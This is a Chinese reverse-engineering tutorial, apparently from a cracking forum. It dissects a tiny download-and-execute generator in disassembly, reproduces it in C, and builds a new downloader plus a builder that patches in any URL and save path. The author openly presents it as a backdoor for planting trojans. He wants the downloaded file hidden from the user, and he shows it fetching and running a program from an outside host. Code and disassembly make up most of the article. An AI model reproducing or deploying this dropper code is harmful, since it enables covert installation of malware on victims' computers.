
# (高手勿入)简单分析"冰狐浪子下载运行 512 生成器

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-292.htm`](https://www.pediy.com/kssd/pediy07/pediy7-292.htm)

简单分析"冰狐浪子下载运行 512 生成器

——兼谈编写属于自己的 `downloader`

我现在的理想是教书育人，不要觉得奇怪，估计你也感到现在太多的垃圾老师了。所以我想做的是取代他们。这就是我尽己所能写点好文章的原因。

感谢冰狐浪子提供如此优秀的作品

本文的测试平台为 `winxp sp1`，没有在其它的系统上测试，可能由于 `align:512` 选项不能在 98 下运行。这次逆向工程的对象是："冰狐浪子下载运行 512 生成器", 在众多的 `downloader` 中，个人觉得这个工具是最理想的(仅仅从下载和执行功能上来看),生成的"冰狐 downRun512.exe"仅有 512 字节(大概是最小的啦)。后门嘛，当然越小越好拉。

## 1."冰狐浪子下载运行 512 生成器"的使用方法：

把 `Url.txt` 文件中的网址改为你要下载并运行的程序的下载地址

\[注意:网址长度不能大于 53 个字符,并且 `Url.txt` 中不要有网址以外的其他多余的字符如回车\]

然后运行<<冰狐浪子下载运行 512 生成器.exe>>

你将在同目录下得到一个大小仅仅为 512 字节的<<冰狐 downRun512.exe>>

`冰狐 downRun512.exe` 可以下载并且执行 `URL` 中对应的程序。

## 2."冰狐浪子下载运行 512 生成器"的缺陷(纯粹个人看法)

注意：作者提到长度不大于 53 个个字符，并且 `Url.txt` 中不要有网址以外的其他多余的字符如回车。

等会儿我会从汇编代码级分析为什么要有这样的限制。以及如何在我们自己写的 `downloader` 中突破这样的限制。另外该软件的缺陷是：只能下载到当前目录，这不是把我们辛辛苦苦从网上下载的木马暴露在使用者的面前吗？在我们自己写的 `downloader` 中一定要避免这个问题，

也就是允许用户指定下载的文件的存放路径。

## 3.本文使用的工具：

`ollydbg1.0` 中文修改版，`Microsoft Visual C++ 6.0`，`Hex Workshop 4.2`。

为什么不用 `IDA`，因为 `IDA` 太慢了，以前试用过 2 次，实在慢得无法忍受。再说了，一般情况下 `ollydbg` 就够用，而且速度飞快。`Hex Workshop` 用于比较文件，和查找字符串的偏移量，以及测试我们的分析是否正确。

## 4.反汇编代码分析:

如果你有一点点汇编和 `c` 语言基础，知道几个 `API`，那么下面的分析应该是种享受，因为冰狐浪子下载运行 512 生成器好象是用汇编语言编写的，结构清晰，反汇编的代码可读性级佳，很值得学习。特别适合于学习 `win32` 汇编。

下面的分析使用的是作者发布的程序中自带的 `URL.txt`,

文件存放的 `URL` 是："http://www.godog.y365.com/cs/icyfox.jpg"。好了,开始享受代码吧：

下面第一段代码是程序入口，解密从 `401000` 开始的 `0x200`（512）个字节，也就是生成的“冰狐 downRun512”的大部分二进制代码，为什么是大部分，而不是全部呢？因为还有 `URL` 是可变的，需要通过 `URL.txt` 来读取,还有生成的文件名“冰狐 downRun512”也是要读取的。

解密 512 个字节，刚好是生成的"冰狐 downRun512.exe"的大小，不是巧合哦

```
0040121F 冰>/$  B9 00020000 mov ecx,200                      ;  0x200 即十进制的 512

00401224  .|.  8D35 001040>lea esi,dword ptr ds:[401000]

0040122A  .|.  8D3D 001040>lea edi,dword ptr ds:[401000]

00401230  .|>  AC         /lods byte ptr ds:[esi]

00401231  .|.  F6D0       |not al        ;解密方法：取反

00401233  .|.  AA         |stos byte ptr es:[edi]    ;再保存回去

00401234  .|.  E2 FA      \\loopd short 冰狐浪子.00401230  ;循环解密
```

检测当前目录下是否存在"`url.txt"`

```
00401236  .|.  6A 00      push 0                       ; /hTemplateFile = NULL

00401238  .|.  68 80000000 push 80                     ; |Attributes = NORMAL

0040123D  .|.  6A 03      push 3                       ; |Mode = OPEN_EXISTING

0040123F  .|.  6A 00      push 0                       ; |pSecurity = NULL

00401241  .|.  6A 01      push 1                       ; |ShareMode = FILE_SHARE_READ

00401243  .|.  68 00000080 push 80000000                ; |Access = GENERIC_READ

00401248 |.  68 04124000  PUSH bh.00401204             ; |FileName = "url.txt"，通过读取 00401204 处的字符串作为要读取的文件名

0040124D  .|.  E8 82000000 call <jmp.&kernel32.CreateFileA>   ; \\CreateFileA

00401252  .|.  83F8 FF   cmp eax,-1                     ;  检测当前目录下是否有 url.txt

00401255  .|.  74 6F     je short 冰狐浪子.004012C6       ;  没有，则程序退出
```

读取"`url.txt`"中的 `0x35` 即 53 个字节,还记得前面提到的 53 个字节的限制吗？就体现在这里了。

```
00401257  .|.  8BD8       mov ebx,eax

00401259  .|.  6A 00      push 0                       ; /pOverlapped = NULL

0040125B  .|.  68 00124000 push 冰狐浪子.00401200             ; |pBytesRead = 冰狐浪子.00401200

00401260  .|.  6A 35      push 35                     ; |BytesToRead = 35 (也就是十进制的 53)

00401262  .|.  68 06104000 push 冰狐浪子.00401006             ; |Buffer = 冰狐浪子.00401006

00401267  .|.  53        push ebx                    ; |hFile

00401268  .|.  E8 73000000 call <jmp.&kernel32.ReadFile>      ; \\ReadFile

0040126D  .|.  53        push ebx                    ; /hObject

0040126E  .|.  E8 5B000000 call <jmp.&kernel32.CloseHandle>   ; \\CloseHandle
```

这 4 句把从"`url.txt`"中的 `0x35` 即 53 个字节 `URL` 进行取反加密，加密长度为把 `URL` 的长度

```
00401273  .|.  8B0D 001240>mov ecx,dword ptr ds:[401200]      ;  把 URL 的长度放到 ecx

00401279  .|.  8D35 061040>lea esi,dword ptr ds:[401006]  ;注意这个地址 401006，到最后生成的"冰狐 downRun512.exe"

其文件偏移量是 6，后面写自己的 downloader 时需要定位到相应的地方

0040127F  .|.  8D3D 061040>lea edi,dword ptr ds:[401006]

00401285  .|>  AC        /lods byte ptr ds:[esi]            ;

00401286  .|.  F6D0       |not al

00401288  .|.  AA        |stos byte ptr es:[edi]

00401289  .|.  E2 FA      \\loopd short 冰狐浪子.00401285
```

调用 `CreateFileA` 创建 "冰狐 downRun512.exe"

```
0040128B  .|.  6A 00      push 0                       ; /hTemplateFile = NULL

0040128D  .|.  68 80000080 push 80000080               ; |Attributes = NORMAL|WRITE_THROUGH

00401292  .|.  6A 02      push 2                       ; |Mode = CREATE_ALWAYS

00401294  .|.  6A 00      push 0                       ; |pSecurity = NULL

00401296  .|.  6A 00      push 0                       ; |ShareMode = 0

00401298  .|.  68 00000040 push 40000000                ; |Access = GENERIC_WRITE

0040129D  .|.  68 0C124000 push 冰狐浪子.0040120C             ; |FileName = "冰狐 downRun512.exe"

004012A2  .|.  E8 2D000000 call <jmp.&kernel32.CreateFileA>   ; \\CreateFileA
```

写入 `0x200` 即 512 字节

```
004012A7  .|.  8BD8       mov ebx,eax                  ;

004012A9  .|.  6A 00      push 0                       ; /pOverlapped = NULL

004012AB  .|.  68 00124000 push 冰狐浪子.00401200             ; |pBytesWritten = 冰狐浪子.00401200

004012B0  .|.  68 00020000 push 200                     ; |nBytesToWrite = 200 (512.)

004012B5  .|.  68 00104000 push 冰狐浪子.00401000             ; |Buffer = 冰狐浪子.00401000 和 00401200 的距离是 0x200 即 512 个字节

004012BA  .|.  53        push ebx                    ; |hFile

004012BB  .|.  E8 26000000 call <jmp.&kernel32.WriteFile>     ; \\WriteFile
```

//任务完成了，程序退出

```
004012C0  .|.  53        push ebx                    ; /hObject

004012C1  .|.  E8 08000000 call <jmp.&kernel32.CloseHandle>   ; \\CloseHandle

004012C6  .|>  6A 00      push 0                       ; /ExitCode = 0

004012C8  .\\.  E8 0D000000 call <jmp.&kernel32.ExitProcess>   ; \\ExitProcess
```

//这里是程序中定义的数据

```
00401204  .  75 72 6C 2E 7>ASCII "url.txt",0  //就是从这里读去的 URL

0040120C     B1          DB B1  ;     "冰狐"的编码，结合下面的"downRun512.exe"，组成"冰狐 downRun512.exe"

0040120D     F9          DB F9

0040120E     BA          DB BA

0040120F     FC          DB FC

00401210  .  64 6F 77 6E 5>ASCII "downRun512.exe",0
```

用 `ollydbg` 动态调试以验证我们的分析(只列出一部分，完整调试请自行动手)：

当执行到 `0040126D` 时，到数据窗口可以看到，从 `URL.txt` 中读取的网址：

```
00401006  68 74 74 70 3A 2F 2F 77  http://w

0040100E  77 77 2E 67 6F 64 6F 67  ww.godog

00401016  2E 79 33 36 35 2E 63 6F  .y365.co

0040101E  6D 2F 63 73 2F 69 63 79  m/cs/icy

00401026  66 6F 78 2E 6A 70 67     fox.jpg
```

当执行到 `0040128B` 时,从 `URL.txt` 中读取的网址被加密成了如下数据：

```
00401006  97 8B 8B 8F C5 D0 D0 88  棆嫃判袌

0040100E  88 88 D1 98 90 9B 90 98  垐褬悰悩

00401016  D1 86 CC C9 CA D1 9C 90  褑躺恃湊

0040101E  92 D0 9C 8C D0 96 9C 86  捫湆袞渾

00401026  99 90 87 D1 95 8F 98     檺囇晱?
```

当执行完 `004012A2 call <jmp.&kernel32.CreateFileA>`后

冰狐浪子下载运行 512 生成器所在的目录下面生成了文件 "冰狐 downRun512.exe"

当执行完 `004012BB call <jmp.&kernel32.WriteFile>`后,程序已经将"冰狐浪子下载运行 512 生成器.exe"

的 `00401000` 和 `00401200` 的距离的 `0x200` 即 512 个字节写入了"冰狐 downRun512.exe"

ok，我们来清理一下思路，整个程序的流程是这样的：

```
开始—>解密 512 个字节

          /不存在—>程序退出(结束)

—>检测当前目录下是否存在"url.txt"—>(2 个分支)

          \\存在—>读取"url.txt"中的 53 个字节—>

对 53 个字节 URL 进行取反加密—>创建 "冰狐 downRun512.exe"—>写入 512 字节(包括加密的 URL)

—>程序退出(结束)
```

用 `vc++` 以 `binary` 方式打开"冰狐 downRun512.exe"，在文件尾部可以看到以下字符串：

```
URLDownloadToFileA

urlmon.dll€

ExitProcess?

WinExec

kernel32.dll?
```

很明显，程序使用 `urlmon.dll` 中的 `URLDownloadToFileA` 来下载文件。然后用 `WinExec` 来执行下载的文件。

如果读者有兴趣不妨分析一下"冰狐 downRun512.exe"。这里我就不分析了，目标不是这个，呵呵。如果不了解以上 `API`，请查阅 `MSDN`。现在可以回答："为什么 `Url.txt` 中不要有网址以外的其他多余的字符如回车"

因为程序对 `URL` 的加密方式是取反，解密后的 `URL` 最后一个字节必须是 0(是 `ASC 0`，不是字符 0 啊)，如果其他多余的字符如回车，取反之后当然不能变成 0 啊，呵呵。

## 5.再现"冰狐浪子下载运行 512 生成器"



考虑到读者大都熟悉 `c` 语言，因此代码用 `c` 来写，完全不使用 `windows` API(某个和我差不多的菜鸟开始欢呼了).

列出代码如下：

```c
int main(int argc, char* argv[])

{
  FILE* fp_src;
  FILE* fp_dest;
  FILE* fp_url;
  unsigned char code[512];
  unsigned char DeCode[512];
  unsigned char URL[53];
  unsigned char* pURL;
  unsigned int i;

  // 1. 打开文件 bh.exe ,这个 bh 是修改过的
  if ((fp_src = fopen("bh.exe", "r+"))==NULL)
  {
    打开文件失败时提示出错。省略......
  }

  //创建文件 test.exe，如果我们的分析是正确的，那么最终的 test.exe 和
  //"冰狐 downRun512.exe"是完全一样的
  省略......

  //打开"url.txt"
  省略......

  for (i=0; i<53; i++)
  {
    URL[i] = 0;    //用于保存 URL 的数组初始化为 0
  }

  pURL = URL;      //pURL 指向保存 URL 的数组
  //读取 512 个字节
  fseek(fp_src, 0x200, SEEK_SET);
  for (i=0; i<0x200; i++)
  {
    code[i] = fgetc(fp_src);
  }

  //解密上面读取的 512 个字节
  for (i=0; i<0x200; i++)
  {
    DeCode[i] = ~code[i];
  }

  //写入解密后的 512 个字节
  for (i=0; i<0x200; i++)
  {
    DeCode[i] = ~code[i];
    fputc(DeCode[i], fp_dest);
  }

  //从 url.txt 中读取 URL
  for (i=0; i<53 && !feof(fp_url); i++)
  {
    pURL[i] = fgetc(fp_url);
    printf("%c", pURL[i]);    //输出 URL 以测试是否正确
  }

  printf("\n\n");
  //写入加密后的 URL
  fseek(fp_dest, 6, SEEK_SET);
  for (i=0; i<strlen(pURL)-1; i++)
  {
    fputc(~pURL[i], fp_dest);
  }

  //关闭 3 个文件，代码省略
  return 0;
}
```

程序生成的 `test.exe` 和"冰狐 downRun512.exe"是完全一样的。说明前面的分析(包括加解密的分析)是正确的。

把读取 512 个字节放到数组中进行硬编码就不用读取"bh.exe"了，完整再现"冰狐浪子下载运行 512 生成器"就这么简单，

剩下的硬编码的事情就交给你了。后面生成我们自己的 `downloader` 也需要硬编码。所以你最好先练习一下。 :P

### 6.编写我们自己的 downloader

还记得前面用 `vc` 打开"冰狐 downRun512.exe"看到的东西吗？写个 `downloader` 如下：

```c
//Downloader: Download file and execute it
//生成的 downloader 只有 1.5K !!!!

#include <windows.h>

#include <urlmon.h>

#pragma comment (lib, "urlmon.lib")

void Entry()  //怎么没有 main 函数，呵呵，为了是生成的 downloader 更小，改名字了
{
  if (URLDownloadToFile(0, "http://www.pediy.com/tools/other/Sdemo/HQB_SDemo2.0.exe",
    "d:\\t.exe", 0, 0) == S_OK)
  {
    WinExec("d:\\t.exe", SW_SHOW);  //SW_SHOW 以非隐蔽方式运行
    exit(0);
  }
}
```

编译时需要对 `vc` 进行设置,如下：

`ALT+F7` -> `Link` 选项 -> 下拉框中选择 `Output` -> 输入项填入 `Entry` -> `Project Options` 中加入下面的东东(如图 1)

`/entry:"Entry" /align:512 /merge:.data=.text /merge:.rdata=.text`

这里容易出错，给出整个 `Project Options` 的数据：

`kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /entry:"Entry" /subsystem:console /incremental:no /pdb:"Release /Download file and execute.pdb" /machine:I386 /out:"Release/Download file and execute.exe" /merge:.data=.text /merge:.rdata=.text`

### 7.我们的 downloader 缺陷分析

`URL`,`URL` 的长度和下载后的存放路径都是固定的，编译的时候就确定了。用 `ollydbg` 打开生成的 `downloader` 看看

```
0040023C   .  68 74 74 70 3>ASCII "http://www.pediy"
0040024C   .  2E 63 6F 6D 2>ASCII ".com/tools/other"
0040025C   .  2F 53 64 65 6>ASCII "/Sdemo/HQB_SDemo"
0040026C   .  32 2E 30 2E 6>ASCII "2.0.exe",0
00400274   .  64 3A 5C 74 2>ASCII "d:\t.exe",0
```

`URL` 和下载后的存放路径是连续存放的，所以不好改动。换种思路，我们在程序中指定一个长一点的 `URL` 和长一点的存放路径，如 100 个字节不是可以存放更长的 `URL` 和路径吗？

可以看到上面的 `URL` 和存放路径都是以 0 结尾，所以我们把 `URL` 和存放路径都初始化为 0。如何才能做到呢？

定义成全局数组就可以了。修改后的 `downloader` 如下：

```c
//Downloader: Download file and execute it
//生成的 downloader 只有 1.5K !!!!

#include <windows.h>

#include <urlmon.h>

#pragma comment (lib, "urlmon.lib")

char DownURL[100] = {"DownURL"};  //"DownURL"没有什么意义，便于查找 URL 在文件中的偏移位置
char PathAndFileName[100] = {"Path"};  //同上

void Entry()  //怎么没有 main 函数，呵呵，为了使生成的 downloader 更小，改名字了
{
  char *pDownURL = NULL;
  char *pPathAndFileName = NULL;

  pDownURL = DownURL;
  pPathAndFileName = PathAndFileName;

  if (URLDownloadToFile(0, pDownURL,
    PathAndFileName, 0, 0) == S_OK)
  {
    WinExec(PathAndFileName, SW_SHOW);  //SW_SHOW 以非隐蔽方式运行
    exit(0);
  }
}
```

当然了，这个 `downloader` 是不能正常执行的(某读者：你......)。没有关系拉，精彩的操作在后面呢。用 `Hex Workshop` 打开上面的代码生成的程序，看看"DownURL"和"Path"在文件的偏移位置。记录下来，分别是 `0x23c` 和 `0x2a0`。呵呵，是不是已经明白了这种方法的思想，不错，就是替换上面的"DownURL"和"Path"为真实的 `URL` 和 `PATH`。因为我们 `URL` 和存放路径都是以 0 结尾，所以 `URL` 和 `PATH` 只要不超过指定的长度(100)可以正常使用。下面我们也写一个根据配置来生成 `downloader` 的程序。名字就叫 `MakeDownloader.exe` 吧，上面的 `downloader` 取名为 `downloader.exe` 便于区别。`MakeDownloader.exe` 的作用是根据 `URL` 和路径来生成 `downloader.exe`。所以我们需要 `downloader.exe` 的硬编码。

下面的代码用于获取硬编码:

```c
//部分代码
//fp_src 是指向 downloader.exe 的文件指针，不要忘了要先打开文件
  if ((fp_src = fopen("downloader.exe", "r+"))==NULL)
  {
    printf("error!!!  Can not open downloader!!!\n\n");
    printf("Press any key to continue\n");
    getchar();
    exit(0);
  }

  while (!feof(fp_src))
  {
    printf("%d,", fgetc(fp_src));
  }
```

将输出的字符串复制出来，放到一个整型数组里，就取得了所有的硬编码。

`MakeDownloader.cpp` 如下：

```c
#include <windows.h>

#include <stdio.h>

int main(int argc, char* argv[])
{
  int i;
  int code_length;
  FILE* fp_dest;

//定义一个数组来存放 downloader 的硬编码
  int code[] =
  {
    数据太多，就不列出来了，具体数据请看程序
  };

  char *pDownURL = NULL;
  char *pPathAndFileName = NULL;

//取得硬编码长度，保存在 code_length 中
  for (i=0; code[i]!=-1; i++)
  {
  }

  code_length = i;

  if(argc != 3)
  {
    printf("\n\t\t Downloader\n");
    printf("\n\t\t\t\tngaut All rights reserved.\n\n");
    printf("Usage: %s <downloadURL> <pathAndFileName> \n", argv[0]);
        return 1;
  }

      pDownURL = argv[1];
      pPathAndFileName = argv[2];
      //创建文件 test.exe
      if ((fp_dest = fopen("test.exe", "w+"))==NULL)
      {
        printf("error!!!  Can not open test.exe!!!\n\n");
        printf("Press any key to continue\n");
        getchar();
        exit(0);
      }

      //写入硬编码
      for (i=0; i<code_length; i++)
      {
        fputc((char)code[i], fp_dest);
      }

      //写入 URL,0x23c 是 URL 在文件中的骗移量
      fseek(fp_dest, 0x23c, SEEK_SET);
      for (i=0; i<strlen(pDownURL); i++)
      {
        fputc((char)pDownURL[i], fp_dest);
      }

      //写入下载文件的存放路径，0x2a0 是路径在文件中的骗移量
      fseek(fp_dest, 0x2a0, SEEK_SET);
      for (i=0; i<strlen(pPathAndFileName); i++)
      {
        fputc((char)pPathAndFileName[i], fp_dest);
      }

      fclose(fp_dest);
      return 0;
}
```

生成的程序的使用方法为：

`C:\Documents and Settings\lobing\桌面>makeDownloader.exe http://www.pediy.com/tools/other/Sdemo/HQB_SDemo2.0.exe d:\t.exe`

当前目录下会生成一个 `test.exe` 文件。执行 `test.exe`，不错吧，文件是不是被下载并且执行了，不用怕，不是木马，删除 `d:\t.exe`。好象我每次都用这个 `URL` 测试，换一个。

`makeDownloader.exe http://hackor.51.net/mm.exe d:\mtv\ok.exe`

当前目录下会生成一个 `test.exe` 文件。执行 `test.exe`，windows 按钮突破专家被下载和执行了吧

是不是很爽。更为具体的应用是大家的事情了，我就不妨碍大家发挥想象力了。希望大家喜欢我的文章。也希望我的文章会造福一些菜鸟。

相应的代码已经提供了，个人感觉其实代码不重要，重要的是思想。现在你不用羡慕 `Anskya Downloader lite`，`Console Web Downloader` 和 `AutoDownload` 了，因为我们自己也可以编写这些程序。

最后感谢我女朋友对我无微不至的关怀，希望我们一辈子幸福!!!。

`4dd466d0e1e0cc123afbe504da2462ca`
